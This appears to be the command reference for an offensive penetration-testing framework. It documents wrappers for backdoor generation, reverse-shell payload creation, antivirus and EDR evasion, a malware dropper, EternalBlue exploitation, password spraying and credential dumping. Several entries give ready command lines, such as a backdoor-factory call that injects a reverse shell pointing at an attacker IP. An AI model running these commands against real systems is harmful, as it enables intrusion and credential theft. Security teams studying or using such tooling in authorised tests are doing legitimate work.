This function runs the 'graudit' tool with the '-A' option for an advanced scan and 
the '-i sessions' option to include session files. The results will be displayed 
directly in the terminal.

Args:
    line (str): Input line from the command interface. This argument is currently 
                not used within the function but is required for the command 
                interface structure.
                
Example:
    To run this function from the command interface, simply type 'graudit' and press enter.
    The function will execute the 'graudit -A -i sessions' command.

Note:
    Ensure that 'graudit' is installed and properly configured in your system's PATH 
    for this function to work correctly.

## msfrpc
Connects to the msfrpcd daemon and allows remote control of Metasploit.

Usage:
    msfrpc -a <IP address> -p <port> -U <username> -P <password> [-S]

This command will prompt the user for necessary information to connect to msfrpcd.

## nuclei
Executes a Nuclei scan on a specified target URL or host.

Usage:
    nuclei -u <URL> [-o <output file>] [other options]

If a URL is provided as an argument, it will be used as the target for the scan.
Otherwise, it will use the target specified in self.params["rhost"].

## parsero
Executes a parsero scan on a specified target URL or host.

Usage:
    parsero -u <URL> [-o <output file>] [other options]

If a URL is provided as an argument, it will be used as the target for the scan.
Otherwise, it will use the target specified in self.params["rhost"].

## sherlock
Executes the Sherlock tool to find usernames across social networks.

This function takes a username as an argument and runs the Sherlock tool 
to check for the username's presence on various social networks. The 
results are saved in CSV format in the `sessions` directory.

Parameters:
line (str): The username to be checked by Sherlock. If not provided, an 
            error message is printed and the function returns.

Returns:
None

Raises:
None

Example:
>>> do_sherlock("example_user")
Running command: sherlock example_user --local -v --csv --print-found

Additional Notes:
- The Sherlock tool must be installed and available in the system path.
- The results are saved in the `sessions` directory as a CSV file.
- The `--local` flag forces the use of a local `data.json` file, 
which should be present in the appropriate directory.

## trufflehog
Executes trufflehog to search for secrets in a given Git repository URL. 
If trufflehog is not installed, it installs the tool automatically. 
This function navigates to the 'sessions' directory and runs trufflehog 
with the provided Git URL, outputting the results in JSON format.

Args:
    line (str): The Git repository URL to scan for secrets.

Returns:
    None

Raises:
    None

Example:
    trufflehog https://github.com/user/repo.git

Notes:
    - Ensure that trufflehog is installed or it will be installed automatically.
    - The output of the trufflehog scan is printed and executed in the 'sessions' directory.

## weevelygen
Generate a PHP backdoor using Weevely, protected with the given password.

This function generates a PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 

Usage:
┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
└╼ $ weevelygen s3cr3t

Parameters:
line (str): The password to protect the generated PHP backdoor.

Returns:
None

Raises:
print_error: If the password argument is not provided.
print_warn: If Weevely is not installed and needs to be installed.

Example:
To generate a PHP backdoor protected with the password 's3cr3t', use the following command:
$ weevelygen s3cr3t

## weevely
Connect to PHP backdoor using Weevely, protected with the given password.

This function Connect to PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 

Usage:
┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
└╼ $ weevely http://victim.local/weevely.php s3cr3t

Parameters:
line (str): the url to Weevely shell and the password to protect the generated PHP backdoor.

Returns:
None

Raises:
print_error: If the password argument is not provided.
print_warn: If Weevely is not installed and needs to be installed.

Example:
To generate a PHP backdoor protected with the password 's3cr3t', use the following command:
$ weevelygen s3cr3t

## changeme
Executes a changeme scan on a specified target URL or host.

Usage:
    changeme [-o <output file>] --oa -t 20 rhost

If a URL is provided as an argument, it will be used as the target for the scan.
Otherwise, it will use the target specified in self.params["rhost"].

## enum4linux_ng
Performs enumeration of information from a target system using `enum4linux-ng`.

1. Executes the `enum4linux-ng` command with the `-A` option to gather extensive information from the specified target.

:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
:param rhost: The target host for enumeration, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually enumerate information from a system, use the following command:
    enum4linu-ng -A <target_host>

Replace `<target_host>` with the IP address or hostname of the target system.

For example:
    enum4linux-ng -A 192.168.1.10

## fuzz
Executes a web server fuzzing script with user-provided parameters.

This function prompts the user for the necessary parameters to run the fuzzing script,
including the target IP, port, HTTP method, directory, file extension, and expected status codes.

Usage:
    fuzzing

Parameters:
    line (str): The command line input for the function (not used directly in the current implementation).

Returns:
    None

Example:
    To run the fuzzing script, enter the required parameters when prompted by the function.

## sharpshooter
Executes a payload creation framework for the retrieval and execution of arbitrary CSharp source code.
SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS, and WSF.

Usage:
    sharpshooter [-o <output file>] --oa -t 20 rhost

This function installs SharpShooter if it is not already installed, prompts the user for the payload type, 
and then runs SharpShooter to create a payload based on the specified type.

Parameters:
    line (str): The command line input for the function (not used directly in the current implementation).

Returns:
    None

Example:
    To create a payload using SharpShooter, ensure you have already generated shellcode using lazymsfvenom or venom,
    and then run this function to specify the payload type and generate the final payload file.

## sliver_server
Starts the Sliver server and generates a client configuration file for connecting clients.
Provides options to download the Sliver client for Windows, Linux, or macOS.

Usage:
    sliver-server [flags]
    sliver-client [command]

This function installs Sliver if it is not already installed, starts the Sliver server,
generates the necessary certificates, and creates a client configuration file. 
It also provides options to download the client for different operating systems.

Parameters:
    line (str): The command line input for the function (not used directly in the current implementation).

Returns:
    None

Example:
    To start the Sliver server, generate the necessary certificates, and download the client,
    run this function. Choose the appropriate client download option based on the operating system.

## gencert
Generates a certificate authority (CA), client certificate, and client key.

Returns:
    str: Paths to the generated CA certificate, client certificate, and client key.

## kerbrute
Executes the Kerbrute tool to enumerate user accounts against a specified target domain controller.

This function performs the following actions:
1. Retrieves necessary parameters such as the target URL and remote host (rhost).
2. Determines the domain based on the provided URL.
3. Validates the remote host address.
4. Constructs and executes the Kerbrute command to enumerate user accounts, saving the results in the sessions/users.txt file.

Parameters:
line (str): Specify 'pass' to use credentials from 'credentials.txt' for password spraying, 'brute' to brute force using 'users.txt' and the RockYou wordlist, or leave empty for default behavior.

Returns:
None

Example:
To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path, 
then run this function to perform the enumeration.

Note:
- The function assumes that the Kerbrute binary (kerbrute_linux_amd64) is present in the system's PATH.
- The file sessions/users.txt should exist and contain the list of usernames to enumerate.

## dacledit
Execute the dacledit.py command for a specific user or all users listed in the users.txt file.

This function interacts with the DACL editor to modify access control lists in an Active Directory environment. 
It allows the user to select a specific user from the list or execute the command for all users.
Install impacket suit to get this script in the examples
Args:
    line (str): The organizational unit (OU) in the format 'OU=EXAMPLE,DC=DOMAIN,DC=EXT'. If not provided, the user is prompted to enter it.

Returns:
    None

Workflow:
    1. Extract parameters and set up paths.
    2. Check the reachability of the remote host.
    3. Prompt the user for an OU if not provided.
    4. Check if the users.txt file exists and read the list of users.
    5. Display the list of users and prompt the user to select a specific user.
    6. Execute the dacledit.py command for the selected user or all users.

Raises:
    FileNotFoundError: If the users.txt file does not exist.

Example:
    To execute the command for a specific user:
    >>> do_dacledit("MARKETING DIGITAL")

    To execute the command for all users:
    >>> do_dacledit("")

## bloodyAD
Execute the bloodyAD.py command for a specific user or all users listed in the users.txt file.

This function interacts with BloodyAD to add users to a group in an Active Directory environment.
It allows the user to select a specific user from the list or execute the command for all users.
(use download_external option 48 to clone the repo)
Args:
    line (str): The organizational unit (OU) in the format 'CN=EXAMPLE,DC=DOMAIN,DC=EXT'. 
                If not provided, the user is prompted to enter it.

Returns:
    None

Workflow:
    1. Extract parameters and set up paths.
    2. Check the reachability of the remote host.
    3. Prompt the user for a CN if not provided.
    4. Check if the users.txt file exists and read the list of users.
    5. Display the list of users and prompt the user to select a specific user.
    6. Execute the bloodyAD.py command for the selected user or all users.

Raises:
    FileNotFoundError: If the users.txt file does not exist.

Example:
    To execute the command for a specific user:
    >>> do_bloodyAD("")

    To execute the command for all users:
    >>> do_bloodyAD("")

## evilwinrm
Executes the Evil-WinRM tool to attempt authentication against the specified target.

This function performs the following actions:
1. Checks if the provided target host (`rhost`) is valid.
2. If the `line` argument is "pass", it searches for credential files with the pattern `credentials*.txt`
and allows the user to select which file to use for executing the command.
3. If `line` is not "pass", it prints an error message indicating the correct usage.

Parameters:
line (str): A command argument to determine the action.
            If "pass", the function searches for credential files and authenticates using the selected file.
            If not "pass", it prints an error message with usage instructions.

Returns:
None

## getTGT
Requests a Ticket Granting Ticket (TGT) using the Impacket tool with provided credentials.

This function performs the following actions:
1. Checks if the provided target host (`rhost`) is valid.
2. Reads credentials from the `credentials.txt` file.
3. Uses each credential (username and password) to request a TGT with the Impacket tool.
4. Constructs and executes the Impacket command to obtain a TGT for each set of credentials.

Parameters:
line (str): A command line argument, not used in this implementation.

Returns:
None

## apache_users
Performs enumeration of users from a target system using `apache-users`.

1. Executes the `apache-users` command with the `-h` option to specified target.

:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
:param rhost: The target host for enumeration, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually enumerate information from a system, use the following command:
    apache-users -h <target_host> -l <wordlist> -p <apache_port> -s 0 -e 403 -t 10

Replace `<target_host>` with the IP address or hostname of the target system.

For example:
    apache-users -h 192.168.1.202 -l /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t 10

## backdoor_factory
Creates a backdoored executable using `backdoor-factory`.

This function checks if `backdoor-factory` is installed, installs it if necessary, and then uses it to 
inject a reverse shell payload into a specified binary file. The binary is backdoored with a 
reverse shell payload that connects back to a specified host and port.

:param line: The absolute path to the file that will be backdoored. If not provided, the user is prompted 
            to enter the path.

:returns: None

Manual execution:
To manually create a backdoored executable, use the following command:
    backdoor-factory -f <file_path> -H <lhost> -P <lport> -s reverse_shell_tcp_inline -J -a -c -l 128 -o <output_file>

Replace `<file_path>` with the path to the binary you want to backdoor, `<lhost>` with the IP address of 
the attacker’s machine, and `<lport>` with the port number to listen on. The `<output_file>` is the path 
where the backdoored binary will be saved.

For example:
    backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe

## davtest
Tests WebDAV server configurations using `davtest`.

This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest` 
to perform a WebDAV server test against a specified URL or the default URL configured in `self.params`.

:param line: The URL of the WebDAV server to test. If provided, it overrides the default URL. 
            If not provided, the function uses the URL specified in `self.params["rhost"]`.

:returns: None

Manual execution:
To manually test a WebDAV server, use the following command:
    davtest --url <url>

Replace `<url>` with the URL of the WebDAV server you want to test.

For example:
    davtest --url http://example.com/webdav

## msfpc
Generates payloads using MSFvenom Payload Creator (MSFPC).

This function checks if `msfpc` is installed and installs it if necessary. It then runs `msfpc`
with the specified parameters to create a payload for penetration testing.

:param line: Not used in this implementation but reserved for future use.

:returns: None

Manual execution:
To manually generate a payload using MSFPC, use the following command:
    msfpc <TYPE> <DOMAIN/IP> <PORT> <CMD/MSF> <BIND/REVERSE> <STAGED/STAGELESS> <TCP/HTTP/HTTPS/FIND_PORT> <BATCH/LOOP> <VERBOSE>

Replace the placeholders with the desired values. For example:
    msfpc windows 192.168.1.10 4444 reverse stageless tcp verbose

Example usage:
    msfpc windows 192.168.1.10        # Windows & manual IP.
    msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
    msfpc stageless cmd py https      # Python, stageless command prompt.
    msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
    msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.

## ivy
Generates payloads using Ivy with various options. Ivy is a payload creation framework for the execution of arbitrary VBA (macro) source code directly in memory. Ivy’s loader does this by utilizing programmatical access in the VBA object environment to load, decrypt and execute shellcode.

This function checks if `Ivy` is installed and installs it if necessary. It then runs `Ivy`
with the specified parameters to create various payloads.

:param line: Not used in this implementation but reserved for future use.

:returns: None

Manual execution:
To manually generate a payload using Ivy, use the following command:
    ./Ivy <OPTIONS>

Replace the placeholders with the desired values. For example:
    ./Ivy -Ix64 test64.vba -Ix86 test32.vba -P Inject -O SampleInject.js
    ./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -process64 C:\windows\system32\notepad.exe -process32 C:\windows\SysWOW64\notepad.exe -O stageless.js

Example usage:
    ivy staged_inject -Ix64 test64.vba -Ix86 test32.vba -P Inject -O SampleInject.js
    ivy stageless_local -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O stageless.js
    ivy one_liner -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -O test.png -stageless

## tord
Execute the tor.sh script with the specified port or default to port 80 if no port is provided.

This function constructs a command to run the `tor.sh` script with superuser privileges,
it defaults to port 80.
The command is then printed and executed.

Parameters:
line (str): Defaults to "80" 

Returns:
None

Example:
>>> do_tord(self, "")
sudo bash sessions/tor.sh

>>> do_tord(self, "")
sudo bash sessions/tor.sh

Note:
Ensure that the `tor.sh` script exists in the `sessions` directory and that you have the 
necessary permissions to execute scripts with `sudo`.

## generatedic
Generates a wordlist based on a target name and a list of characters, with various combinations.

This function prompts the user for a target name and a wordlist name, then generates various combinations 
of the target name with a given list of characters. The combinations include single, double, triple, fourth, 
fifth, sixth, and intercalated character variations. The generated passwords are saved to the specified 
wordlist file.

:param line: Not used in this function.

:returns: None

Manual execution:
To manually generate a wordlist, run the script and follow the prompts to enter the target name, 
wordlist name, and additional characters if desired.

For example:
    Enter target name(Ex. john) ::: john
    Enter wordlist name ::: my_wordlist.txt
    Char List ::: 1 2 3 4 5 6 7 8 9 0 ! @ # $
    Do you want to add more characters in char List[y/n] ::: y
    Enter characters by commas(Ex. : ^,&,*,) ::: ^,&,*

## trace
Traces the DNS information for a given domain using the FreeDNS service. (using freedns IP Not your IP)

This method performs a DNS trace lookup for the specified domain by
sending an HTTP GET request to the FreeDNS service. If no domain is provided
in the input parameter `line`, it defaults to using the URL specified in the
instance's parameters.

Parameters:
line (str): The domain name to trace. If not provided, the method uses the
            domain extracted from `self.params["url"]`.

Returns:
None: This method executes a system command and does not return a value.

Example:
>>> self.do_trace("example.com")
Executes a DNS trace for "example.com".

Notes:
- Ensure that the `self.params["url"]` is set with a valid URL if no domain
is provided.
- The method uses `os.system` to execute the trace command, which may not
be the most secure or efficient method for production code. Consider using
a library like `requests` for HTTP operations if security and efficiency
are concerns.

## veil
Generates payloads using Veil-Evasion with various options. Veil-Evasion is a payload creation framework
for generating payloads that evade antivirus detection. This function checks if `Veil-Evasion` is installed
and installs it if necessary. It then runs `Veil-Evasion` with the specified parameters to create various payloads.

:param line: Not used in this implementation but reserved for future use.

:returns: None

Manual execution:
To manually generate a payload using Veil-Evasion, use the following command:
    ./Veil-Evasion.py -p <PAYLOAD> --<OPTION> <VALUE>

Replace the placeholders with the desired values. For example:
    ./Veil-Evasion.py -p python/meterpreter/rev_https LHOST=192.168.1.100 LPORT=443

Example usage:
    veil python_meterpreter_rev_https LHOST=192.168.1.100 LPORT=443
    veil ruby_meterpreter_rev_tcp LHOST=192.168.1.100 LPORT=4444

## empire
Generates payloads using PowerShell Empire with various options.

:param line: Not used in this implementation but reserved for future use.

:returns: None

## evil_ssdp
Runs evil-ssdp with various options and user-selected templates.

:param line: Not used in this implementation but reserved for future use.

:returns: None

## shellfire
Runs Shellfire with various options and allows generating payloads.

:param line: Not used in this implementation but reserved for future use.

:returns: None

## graph
Generates a graph from JSON payload files containing URL, RHOST, and RPORT.

:param line: Not used in this implementation but reserved for future use.

:returns: None

## netexec
Executes netexec with various options for network protocol operations.

:param line: Not used directly but reserved for future use.

:returns: None

## scarecrow
Executes ScareCrow with various options for bypassing EDR solutions and executing shellcode.
to create the shellcode.bin you need run venom or run lazymsfvenom, or run msfvenom yourself :D
:param line: Not used directly but reserved for future use.
:returns: None

## createmail
Generate email permutations based on a full name and domain, then save them to a file.

This function prompts the user for a full name and domain, generates various email
permutations based on that information, and saves the results in a text file located
in the `sessions` directory.

Parameters:
line (str): used as Fullname.

Internal Variables:
full_name (str): The full name entered by the user, defaulting to 'John Doe'.
domain (str): The domain entered by the user, defaulting to 'example.com'.

Returns:
None

Example Usage:
- To generate emails using default values: `createmail`
- To specify a full name and domain: `createmail`

Note:
- The generated emails will be stored in a file named `emails_{full_name}_{domain}.txt`
  within the `sessions` directory.

## eyewitness
Executes EyeWitness to capture screenshots from a list of URLs. 
You need to provide a file containing URLs or a single URL to capture.
:param line: Not used directly but reserved for future use.
:returns: None

## secretsdump
Run secretsdump.py with the provided domain, username, password, and IP address.

:param line: This parameter is not used in the function but can be reserved for future use.

:returns: None

Manual execution:
To manually run `secretsdump.py`, use the following command:

    secretsdump.py <domain>/<username>:<password>@<ip_address>

This function prompts the user for domain, username, password, and IP address.

## getuserspns
Run GetUserSPNs.py with the provided domain, username, password, and IP address.

:param line: This parameter is not used in the function but can be reserved for future use.

:returns: None

Manual execution:
To manually run `GetUserSPNs.py`, use the following command:

    GetUserSPNs.py <domain>/<username>:<password> -dc-ip <IP of DC> -request

This function prompts the user for domain, username, password, and IP address.

## passwordspray
Perform password spraying using crackmapexec with the provided parameters.

:param line: This parameter is not used in the function but can be reserved for future use.

:returns: None

Manual execution:
To manually run `crackmapexec` for password spraying, use the following command:

    crackmapexec smb <IP Address> -u <users_file> -p <password> --continue-on-success

This function prompts the user for IP address, user file, and password.

## vscan
Perform port scanning using vscan with the provided parameters.

:param line: This parameter is not used in the function but can be reserved for future use.

:returns: None

Manual execution:
To manually run `vscan` for port scanning, use the following command:

    ./vscan -host <hosts> -p <ports>

This function prompts the user for the target hosts and ports, and executes the vscan command accordingly.

## shellshock
Attempt to exploit the Shellshock vulnerability (CVE-2014-6271, CVE-2014-7169).

This function generates HTTP requests with a crafted payload to detect if a target is vulnerable to Shellshock.

:param line: Input parameters for the function.
:returns: None

## generate_revshell
Generate a reverse shell in various programming languages.

This function prompts the user to choose a reverse shell type (Bash, Python, NetCat, PHP, Ruby, Perl, Telnet, NodeJS, Golang, PowerShell) 
and then asks for the necessary parameters (IP and port). Based on the user's input, it generates the corresponding 
reverse shell command.

:param line: Not used in this implementation.
:returns: None

## alterx
Executes the 'alterx' command for subdomain enumeration on the provided domain. If 'alterx'
is not installed, the function automatically downloads, installs, and configures it. The result
of the subdomain enumeration is saved in a session-specific text file.

Steps performed by the function:

1. **Check if 'alterx' is installed:**
- Uses `is_binary_present("alterx")` to verify if the 'alterx' binary is available in the system.
- If the binary is not found, the function prints a warning and proceeds to download and install 'alterx'.

2. **Installation of 'alterx':**
- Executes a system command to create a directory named 'alterx' in the user's home directory.
- Downloads the 'alterx' version 0.0.4 (Linux 64-bit) from GitHub and extracts it into the 'alterx' directory.

3. **Add 'alterx' to system PATH:**
- Depending on the user's shell (`bash` or `zsh`), it appends the 'alterx' directory to the system PATH 
    by modifying the appropriate shell configuration file (`~/.bashrc` or `~/.zshrc`). This ensures 'alterx' 
    can be executed from any directory.

4. **Obtain the domain:**
- Retrieves the URL from the class parameter `self.params["url"]`.
- Extracts the domain from the URL using `get_domain(url)`.
- If no domain is provided as an argument in `line`, prompts the user to input a domain, defaulting to 
    the previously extracted domain.

5. **Execute 'alterx' on the domain:**
- Executes the 'alterx' tool on the specified domain via a system command.
- The subdomain enumeration results are saved to a file in the 'sessions' directory, with the filename 
    `subdomain_dic_<domain>.txt`.

Parameters:
- line (str): The domain on which to run 'alterx'. If empty, the function prompts the user for input.

Returns:
- None: The function performs its operations but does not return any value.

Dependencies:
- The function relies on the external tool 'alterx' and assumes the presence of the `is_binary_present()` 
and `get_domain()` helper functions.

## allin
Execute the AlliN.py tool with various scan modes and parameters.

This function prompts the user to choose a scan type (e.g., pscan, sfscan, bakscan), 
and then asks for the necessary parameters (host, ports, project name, etc.). 
Based on the user's input, it generates the corresponding command and executes it.

:param line: Not used in this implementation.
:returns: None

## dr0p1t
Execute the Dr0p1t tool to create a stealthy malware dropper.

This function prompts the user to input the necessary parameters for 
generating a dropper, including the malware URL, persistence options, 
and additional configurations. Based on the user's input, it constructs 
the command and executes it.

:param line: Not used in this implementation.
:returns: None

## gitdumper
Install and execute the git-dumper tool to download Git repository content.

This function checks if git-dumper is installed, and if not, installs it using pip.
Then, it prompts the user to input the necessary parameters to run git-dumper, constructs
the command, and executes it.

:param line: Not used in this implementation.
:returns: None

## powershell_cmd_stager
Generate and execute a PowerShell command stager to run a .ps1 script.

This function takes the name of a PowerShell script (.ps1), encodes its content in base64,
and constructs a command to execute the script using PowerShell in a hidden and elevated manner.
The function then prints the generated command.

:param line: The name of the PowerShell script file to encode and execute.
:returns: None

## shellcode_search
Search the shell-storm API for shellcodes using the provided keywords.

This function sends a GET request to the shell-storm API with the specified keywords.
It then prints the results.

:param line: A string containing the keywords to search for.
:returns: None

## ligolo
Automates the setup and execution of Ligolo server and client for tunneling and port forwarding.

:param line: The command line input containing the port number for Ligolo setup.
:type line: str
:returns: None

## addusers
Opens or creates the users.txt file in the sessions directory for editing using nano.

:param line: Not used directly but reserved for future use.

:returns: None

## windapsearch
Execute the windapsearch tool to perform Active Directory Domain enumeration through LDAP queries.

This function allows the user to specify various parameters for executing different LDAP query modules
using windapsearch. It handles user input for domain, username, password, and other options, constructs
the command, and executes it.

:param line: Not used in this implementation.
:returns: None

## passtightvnc
Decrypts TightVNC passwords using Metasploit.

This function demonstrates how TightVNC passwords can be decrypted using the known hardcoded DES key
from the program and Metasploit's `Rex::Proto::RFB::Cipher.decrypt` function.

Steps:
- Receives the password in hexadecimal format from the command line input.
- Creates a Metasploit resource script that includes commands to decrypt the TightVNC password.
- Executes Metasploit with the created resource script and then deletes the temporary file.
- Prints the decrypted password.

:param line: The TightVNC password in hexadecimal format.
:type line: str
:returns: None

Manual execution:
To manually decrypt a TightVNC password, you would need to:
- Use Metasploit's `Rex::Proto::RFB::Cipher.decrypt` function with the hardcoded DES key and the hexadecimal password.

Example:
passtightvnc D7A514D8C556AADE

## shadowsocks
Execute the Shadowsocks tool to create a secure tunnel for network traffic.

This function allows the user to specify various parameters for configuring and running the Shadowsocks client
or server. It handles user input for server address, port, password, encryption method, and other options, 
constructs the command, and executes it.

:param line: Not used in this implementation.
:returns: None

## kusa
Execute Kusanagi to generate payloads for command, code, or file injection.

This function allows the user to specify various parameters for configuring and running Kusanagi to
generate payloads for reverse/bind shells or injected files/code. It handles user input for target addresses,
ports, encoding, obfuscation, badchars, and other options, constructs the command, and executes it.

:param line: Not used in this implementation.
:returns: None

## windapsearchscrapeusers
Extracts usernames from a JSON output generated by go-windapsearch and appends them
to the file sessions/users.txt.

The function loads the JSON file, parses the `sAMAccountName` attribute for each user, and appends
the username to the sessions/users.txt file.

:param line: Path to the JSON file (e.g., 'sessions/<dc_ip>_windap.json').
:returns: None

## downloader
Generate a downloader command for files in the sessions directory.

This function lists all files in the 'sessions' directory recursively, excluding certain file extensions.
The user can select a file, choose a download method, and the command is generated and copied to the clipboard.

:param line: Optional output filename for the downloader command.
:returns: None

## ldapsearch
Executes an LDAP search against a target remote host (rhost) and saves the results.

This function performs the following tasks:
1. Extracts the target remote host (rhost) from the class parameters.
2. Verifies if the rhost is valid using a custom `check_rhost` function.
3. Retrieves the domain information from the parameters.
4. Ensures that the 'ldapsearch' binary is available on the system. If it's missing, the function attempts to install it using the system's package manager (`apt`).
5. Constructs the LDAP search query based on the domain information, splitting the domain into components to form the correct base DN (Distinguished Name).
6. Runs the LDAP search with the following options:
    - `-x`: Simple authentication (anonymous bind).
    - `-H`: Specifies the LDAP server URL (using the rhost).
    - `-b`: Specifies the search base (constructed from the domain).
    - `-s sub`: Indicates the search scope, where 'sub' performs a subtree search.
7. Saves the result of the search to a log file under the 'sessions' directory, named based on the rhost.
8. Displays the log file content and checks for any 'lock' entries, which could indicate locked accounts or security incidents.
9. Extracts `userPrincipalName` attributes from the log, parses them, and appends the usernames (without domain) to a users.txt file for further analysis.

This function is useful in penetration testing engagements where LDAP enumeration is part of the reconnaissance phase. It automates LDAP queries and extracts useful user information, which could assist in credential harvesting, password spraying, or other user-based attacks.

## eternal
Automates the EternalBlue (MS17-010) exploitation process using Metasploit.

This function performs the following tasks:
1. Selects the EternalBlue Metasploit module for Windows SMB exploitation.
2. Displays the current options for the module.
3. Sets the required payload options, such as `LHOST` and `RHOST`.
4. Executes the exploit and attempts to gain access to the target machine.

:param line: Command line input that provides the LHOST and RHOST.
:type line: str
:returns: None

## cve
Search for a CVE using the CIRCL API.

This function sends a GET request to the CIRCL API to retrieve CVE details 
and prints relevant information to the screen.

:param line: A string containing the CVE ID (optional).
:returns: None

## evidence
Compresses the 'sessions' folder and encodes it into a video using the lazyown_infinitestorage.py script.
If a filename is provided as an argument, it decodes the specified video instead.

This function operates in two modes depending on the input:
1. **Encode Mode (default)**:
- Compresses the contents of the 'sessions' directory into a ZIP file named 'sessions.zip'.
- Utilizes the lazyown_infinitestorage.py script to convert the ZIP file into a high-definition video file named 'encoded_output.avi' with a frame size of 1920x1080 and a frame rate of 25 FPS.

2. **Decode Mode**:
- When the 'line' parameter contains the string "decode", it lists all available video files in the 'sessions' directory (files with .mp4, .mkv, or .avi extensions).
- If there are no video files present, it prints an error message and exits.
- Prompts the user to select a video by entering its corresponding number.
- Constructs a command to decode the selected video file using the lazyown_infinitestorage.py script, outputting the decoded result to a specified directory.

:param line: An optional parameter that, when provided, indicates that the user wants to decode a video. If not provided, the function operates in encode mode.
:type line: str
:returns: None

Example usage:
    - To compress and encode: do_evidence()
    - To decode a video: do_evidence('decode')

Notes:
- The 'sessions' directory must exist and contain files for encoding.
- The lazyown_infinitestorage.py script must be present in the specified directory.
- Ensure that the output paths for both encoding and decoding do not conflict with existing files.

## rejetto_hfs_exec
HttpFileServer version 2.3. Vulnerable using the module rejetto_hfs_exec of metasploit
:param line: Command line input that provides the LHOST and RHOST.
:type line: str
:returns: None

## ms08_067_netapi
SMB CVE-2008-4250. Vulnerable using the module ms08_067_netapi of metasploit
:param line: Command line input that provides the LHOST and RHOST.
:type line: str
:returns: None

## automsf
Try to check if Vulnerable using the module passed by argument of lazyown example automsf exploit/windows/iis/iis_webdav_upload_asp to use in metasploit
:param line: Command line input that provides the LHOST and RHOST.
:type line: str
:returns: None

## iis_webdav_upload_asp
(CVE-2017-7269). Vulnerable using the module iis_webdav_upload_asp of metasploit
:param line: Command line input that provides the LHOST and RHOST.
:type line: str
:returns: None

## nano
Opens or creates the file using line in the sessions directory for editing using nano.

:param line: name of the file to use in nano in session directory.

:returns: None

## nc
Runs `nc` with the specified port for listening.

This function starts a `nc` listener on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.

Usage:
    pwncatcs <port>

:param line: The port number to use for the `nc` listener. If not provided, it defaults to the `lport` parameter.
:type line: str
:returns: None

Manual execution:
1. Ensure that `nc` is installed and accessible from your command line.
2. The port number can either be provided as an argument or be set in the `lport` parameter of the function.
3. Run the function to start `nc` on the specified port.

If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.

After starting the listener, the function prints a message indicating that `nc` is running on the specified port and another message when the session is closed.

Dependencies:
- `nc`: A tool used for creating reverse shells or bind shells.

## createjsonmachine
Create a new JSON payload file based on the template provided in payload.json.

This function reads an existing JSON file named 'payload.json' and 
allows the user to update specific fields. The following fields can 
be modified:

- 'url': The new URL to connect to, which can be entered manually 
or automatically generated based on the input parameter 'line'.
- 'domain': The new domain associated with the URL, similarly 
generated or entered.
- 'rhost': The new remote host IP address that needs to be specified 
by the user.

All other fields from the original payload are preserved in the new 
JSON file, ensuring that no other data is lost or altered.

The newly created JSON payload will be saved in a new file with the 
format 'payload_<new_name>.json', where <new_name> is derived 
from the domain name's subpart.

Parameters:
line (str): An optional string parameter that, if provided, is used 
            to generate the new 'url' and 'domain'. If empty, 
            the user will be prompted to enter values for 'url' 
            and 'domain'.

Returns:
None

## xss
Executes the XSS (Cross-Site Scripting) vulnerability testing procedure 
using user-defined parameters and configurations.

This method guides the user through the process of setting up and 
executing XSS payload injections against a specified target domain. 
It prompts the user for necessary input, including the XSS payload 
URL, the target domain, and the request timeout settings. The 
function ensures that all required inputs are provided and valid 
before proceeding with the injection process.

Parameters:
    line (str): A line of input that may contain additional parameters 
                or commands (not utilized within this method).

Raises:
    ValueError: If the provided payload URL or target domain is empty, 
                indicating that these are required for the injection 
                process.

This method leverages user input for flexibility, allowing 
customized testing scenarios for XSS vulnerabilities.

## arjun
Executes an Arjun scan on the specified URL for parameter discovery.

This function checks if Arjun is installed on the system, installs it if necessary, and then constructs
a command to run Arjun against the provided URL with user-defined options.

Parameters:
    line (str): Input line, not currently used.

## transform
Transforms the input string based on user-defined casing style.

This command asks the user for a casing style (e.g., lower, upper, camel, pascal)
and transforms the input string accordingly.

Parameters:
    line (str): Input string to be transformed.

## finger_user_enum
Executes the `finger-user-enum` tool for enumerating users on the target host.

This function checks if the `finger-user-enum` script is available locally; if not, it clones 
it from GitHub. It then constructs a command to run the tool with the provided wordlist of 
usernames and target host, and executes the command in the system.

Parameters:
    line (str): Input line, not currently used.

Returns:
    None: Outputs the command executed and any messages during execution.

## duckyspark
duckyspark Compiles and uploads an .ino sketch to a Digispark device using Arduino CLI and Micronucleus.

duckyspark method checks if Arduino CLI and Micronucleus are installed on the system.
If they are not available, it installs them. It then compiles a Digispark sketch 
and uploads the generated .hex file to the Digispark device.

The method duckyspark performs the following actions:
1. Checks for the presence of Arduino CLI and installs it if not available.
2. Configures Arduino CLI for Digispark if not already configured.
3. Generates a reverse shell payload and prepares the sketch for Digispark.
4. Compiles the prepared Digispark sketch using Arduino CLI.
5. Checks for the presence of Micronucleus and installs it if not available.
6. Uploads the compiled .hex file to the Digispark device using Micronucleus.

Args:
    line (str): Command line input provided by the user, which may contain additional parameters.

Returns:
    None: The function does not return any value but may modify the state of the system
        by executing commands.

## username_anarchy
Generate usernames using the username-anarchy tool based on user input.

This function prompts the user to either provide names directly or select
options such as auto-generation based on country datasets, input files, and 
